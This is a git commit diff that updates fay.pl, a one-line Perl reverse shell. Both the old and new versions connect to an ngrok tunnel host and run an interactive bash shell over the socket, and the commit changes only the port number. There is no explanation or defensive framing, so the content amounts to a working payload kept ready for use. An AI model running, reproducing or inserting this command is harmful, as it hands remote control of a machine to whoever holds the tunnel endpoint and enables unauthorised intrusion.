477109092df63b175d62a628f478fc5d9e26fade
rumahjsp <2406045@itg.ac.id>
2026-04-30 22:32:17 +0700

    Update fay.pl

--- fay.pl
+++ fay.pl
@@ -1,1 +1,1 @@
-perl -e 'use Socket;$i="0.tcp.ap.ngrok.io";$p=18230;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
+perl -e 'use Socket;$i="0.tcp.ap.ngrok.io";$p=26077;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
